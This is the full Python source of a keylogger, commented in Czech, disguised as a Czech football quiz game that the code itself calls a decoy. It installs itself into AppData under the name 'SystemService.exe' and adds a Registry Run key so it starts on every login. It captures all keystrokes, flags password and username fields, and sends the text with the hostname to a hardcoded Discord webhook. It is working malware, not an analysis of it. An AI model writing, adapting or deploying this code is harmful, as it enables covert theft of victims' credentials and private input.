import json
import os
import platform
import shutil
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone
from pathlib import Path

import requests
from pynput import keyboard

# ═══════════════════════════════════════════════════════════════
# KONFIGURACE
# ═══════════════════════════════════════════════════════════════

IS_WINDOWS = platform.system().lower() == "windows"
IS_MACOS = platform.system().lower() == "darwin"

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553128485424201800/7K1yoUlOaf_GLSwJHmu8pJ_Jp0He-bg2VOldAjYs4dk8rIN3NrUMRFHfoUcJSSnPLuAb"

FLUSH_INTERVAL = 5
FLUSH_ON_CHARS = 20
FLUSH_ON_ENTER = True
CAPTURE_WINDOW_TITLE = True
CAPTURE_FIELD_TYPE = True
MAX_RETRIES = 3
RETRY_DELAY = 5

# Persistence
APP_DIR = Path(os.environ.get("APPDATA", Path.home() / ".local/share")) / "SystemService"
APP_NAME = "SystemService.exe"
REGISTRY_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
REGISTRY_VALUE = "SystemServiceUpdate"

# ═══════════════════════════════════════════════════════════════
# PERSISTENCE — instalace do AppData + Registry Run key
# ═══════════════════════════════════════════════════════════════

def is_installed():
    """Check jestli uz bezi z AppData (silent mode)."""
    return Path(sys.argv[0]).parent == APP_DIR or "--silent" in sys.argv


def install():
    """Zkopiruje exe do AppData a zapise registry Run key."""
    if not IS_WINDOWS:
        return
    try:
        APP_DIR.mkdir(parents=True, exist_ok=True)
        src = Path(sys.argv[0])
        dst = APP_DIR / APP_NAME
        if src != dst and src.exists():
            shutil.copy2(src, dst)

        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, REGISTRY_KEY, 0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(
            key, REGISTRY_VALUE, 0, winreg.REG_SZ, f'"{dst}" --silent'
        )
        winreg.CloseKey(key)
    except Exception:
        pass  # instalace selze → bezi jen z aktualniho umisteni


# ═══════════════════════════════════════════════════════════════
# DECOY HRA — Slovní Fotbalový Kvíz
# ═══════════════════════════════════════════════════════════════

QUIZ_QUESTIONS = [
    {
        "q": "Který klub vyhrál Ligu mistrů UEFA nejvícekrát?",
        "options": ["A) Real Madrid", "B) AC Milan", "C) Liverpool", "D) Bayern"],
        "answer": "A",
    },
    {
        "q": "Kdo je rekordman v počtu gólů na Mistrovství světa?",
        "options": ["A) Pelé", "B) Miroslav Klose", "C) Ronaldo", "D) Messi"],
        "answer": "B",
    },
    {
        "q": "Ve kterém roce se MS ve fotbale konalo poprvé?",
        "options": ["A) 1926", "B) 1930", "C) 1934", "D) 1950"],
        "answer": "B",
    },
    {
        "q": "Který hráč vyhrál Zlatý míč nejvícekrát?",
        "options": ["A) Cristiano Ronaldo", "B) Lionel Messi", "C) Michel Platini", "D) Johan Cruyff"],
        "answer": "B",
    },
    {
        "q": "Jaká je délka fotbalového hřiště (max)?",
        "options": ["A) 100 m", "B) 110 m", "C) 120 m", "D) 90 m"],
        "answer": "C",
    },
]


def run_quiz():
    """Terminal quiz — decoy pro uzivatele."""
    print("=" * 40)
    print("     ⚽ SLOVNÍ FOTBALOVÝ KVÍZ ⚽")
    print("=" * 40)
    print()
    score = 0
    for i, q in enumerate(QUIZ_QUESTIONS, 1):
        print(f"Otázka {i}/{len(QUIZ_QUESTIONS)}:")
        print(f"  {q['q']}")
        for opt in q["options"]:
            print(f"    {opt}")
        answer = input("\n  Tvá odpověď (A/B/C/D): ").strip().upper()
        if answer == q["answer"]:
            print("  ✅ Správně!\n")
            score += 1
        else:
            print(f"  ❌ Špatně! Správná odpověď: {q['answer']}\n")
    print("=" * 40)
    print(f"  Výsledek: {score}/{len(QUIZ_QUESTIONS)}")
    if score == len(QUIZ_QUESTIONS):
        print("  🏆 Dokonalý výsledek!")
    elif score >= 3:
        print("  👍 Dobrá práce!")
    else:
        print("  Zkus to znovu!")
    print("=" * 40)
    input("\nStiskni Enter pro ukončení...")


# ═══════════════════════════════════════════════════════════════
# AKTIVNI OKNO + PROCESS NAME + TYP POLE
# ═══════════════════════════════════════════════════════════════

def get_active_window_title():
    if not CAPTURE_WINDOW_TITLE:
        return None
    try:
        if IS_WINDOWS:
            import win32gui
            hwnd = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(hwnd)
        elif IS_MACOS:
            script = 'tell application "System Events" to get name of front window of (first application process whose frontmost is true)'
            result = subprocess.run(
                ["osascript", "-e", script],
                capture_output=True, text=True, timeout=2
            )
            title = result.stdout.strip()
            return title if title else None
        else:
            return None
    except Exception:
        return None


def get_active_process_name():
    try:
        if IS_WINDOWS:
            import win32gui
            import win32process
            import psutil
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            return psutil.Process(pid).name()
        elif IS_MACOS:
            script = 'tell application "System Events" to get name of first application process whose frontmost is true'
            result = subprocess.run(
                ["osascript", "-e", script],
                capture_output=True, text=True, timeout=2
            )
            name = result.stdout.strip()
            return name if name else None
        else:
            return None
    except Exception:
        return None


def get_field_context():
    if not CAPTURE_FIELD_TYPE:
        return (False, False, None)

    if IS_MACOS:
        title = (get_active_window_title() or "").lower()
        if any(w in title for w in ["heslo", "password", "přihlášení", "prihlaseni", "login", "sign in", "zadejte"]):
            return (False, True, title)
        return (False, False, None)

    if not IS_WINDOWS:
        return (False, False, None)
    try:
        import uiautomation as auto
        control = auto.GetFocusedControl()
        if control is None:
            return (False, False, None)

        is_password = bool(getattr(control, "IsPassword", False))
        name = (control.Name or "").lower()
        auto_id = (control.AutomationId or "").lower()

        USERNAME_HINTS = [
            "username", "user name", "user", "login", "log in", "logon",
            "email", "e-mail", "mail", "jmeno", "uživatel", "uzivatel",
            "prihlasovaci", "přihlašovací", "account", "ucet", "účet",
        ]
        is_username = any(h in name or h in auto_id for h in USERNAME_HINTS)

        field_hint = name or auto_id or None
        return (is_password, is_username, field_hint)
    except Exception:
        return (False, False, None)


def get_full_context():
    return (
        get_active_process_name(),
        get_active_window_title(),
        *get_field_context(),
    )


# ═══════════════════════════════════════════════════════════════
# DORUCENI — Discord webhook
# ═══════════════════════════════════════════════════════════════

class WebhookDelivery:
    def __init__(self):
        self.buffer = []
        self.lock = threading.Lock()

    def add(self, text: str, ctx: tuple):
        app, title, is_pw, is_user, hint = ctx
        with self.lock:
            self.buffer.append({
                "char": text,
                "app": app or "unknown",
                "title": title or "",
                "pw": is_pw,
                "user": is_user,
                "hint": hint or "",
            })

    def _hostname(self):
        import socket
        try:
            return socket.gethostname()
        except Exception:
            return "unknown"

    def _group_entries(self, entries):
        grouped = {}
        for e in entries:
            app = e["app"]
            if app not in grouped:
                grouped[app] = {"normal": "", "password": "", "username": "", "title": e["title"]}
            if e["pw"]:
                grouped[app]["password"] += e["char"]
            elif e["user"]:
                grouped[app]["username"] += e["char"]
            else:
                grouped[app]["normal"] += e["char"]
        return grouped

    def _format_discord_payload(self, grouped):
        ts = datetime.now(timezone.utc).isoformat()
        fields = []
        for app, data in grouped.items():
            body = ""
            if data["username"]:
                body += f"**[USERNAME]** `{data['username']}`\n"
            if data["password"]:
                body += f"**[PASSWORD]** `{data['password']}`\n"
            if data["normal"]:
                body += f"{data['normal']}"
            if body:
                fields.append({
                    "name": f"🖥️ {app}",
                    "value": body[:1000],
                    "inline": False,
                })
        return {
            "embeds": [{
                "title": "Keystroke Log",
                "description": f"Host: `{self._hostname()}`",
                "color": 0xFF0000,
                "timestamp": ts,
                "fields": fields[:25],
            }]
        }

    def _deliver(self, grouped):
        for attempt in range(MAX_RETRIES):
            try:
                payload = self._format_discord_payload(grouped)
                resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
                resp.raise_for_status()
                return True
            except Exception:
                if attempt < MAX_RETRIES - 1:
                    time.sleep(RETRY_DELAY)
        return False

    def flush(self):
        with self.lock:
            if not self.buffer:
                return
            entries = list(self.buffer)
            self.buffer.clear()
        grouped = self._group_entries(entries)
        if self._deliver(grouped):
            pass
        else:
            with self.lock:
                for e in reversed(entries):
                    self.buffer.insert(0, e)

    def scheduler(self):
        while True:
            time.sleep(FLUSH_INTERVAL)
            self.flush()


# ═══════════════════════════════════════════════════════════════
# KEYLOGGER
# ═══════════════════════════════════════════════════════════════

SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "[ENTER]\n",
    keyboard.Key.tab: "[TAB]",
    keyboard.Key.backspace: "[BKSP]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.shift: "",
    keyboard.Key.shift_r: "",
    keyboard.Key.ctrl_l: "[CTRL]",
    keyboard.Key.ctrl_r: "[CTRL]",
    keyboard.Key.alt_l: "[ALT]",
    keyboard.Key.alt_r: "[ALT]",
    keyboard.Key.caps_lock: "[CAPS]",
    keyboard.Key.cmd: "[WIN]",
    keyboard.Key.delete: "[DEL]",
}


class Keylogger:
    def __init__(self):
        self.delivery = WebhookDelivery()

    def _format_key(self, key):
        if key in SPECIAL_KEYS:
            return SPECIAL_KEYS[key]
        try:
            return key.char if key.char else ""
        except AttributeError:
            pass
        try:
            return f"[{key.name.upper()}]"
        except AttributeError:
            return ""

    def _on_press(self, key):
        text = self._format_key(key)
        if not text:
            return
        ctx = get_full_context()
        self.delivery.add(text, ctx)

        if (FLUSH_ON_ENTER and key == keyboard.Key.enter) or \
           len(self.delivery.buffer) >= FLUSH_ON_CHARS:
            self.delivery.flush()

    def run_background(self):
        """Spusti keylogger v daemon threadu — neblokuje hlavni thread."""
        t_scheduler = threading.Thread(target=self.delivery.scheduler, daemon=True)
        t_scheduler.start()
        t_listener = threading.Thread(target=self._start_listener, daemon=True)
        t_listener.start()

    def _start_listener(self):
        with keyboard.Listener(on_press=self._on_press) as listener:
            listener.join()


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    silent = "--silent" in sys.argv

    if not silent:
        # Prvni spusteni: instalace + decoy hra + keylogger na pozadi
        install()
        logger = Keylogger()
        logger.run_background()
        run_quiz()  # blokuje hlavni thread — hra bezi
        # Po zavreni hry: keylogger thread dale bezi (daemon=True)
        # Proces zustava zivy dokud ho nekdo nezabije
        while True:
            time.sleep(60)  # keep alive
    else:
        # Silent mode: jen keylogger, zadne okno, zadny output
        logger = Keylogger()
        logger.run_background()
        while True:
            time.sleep(60)
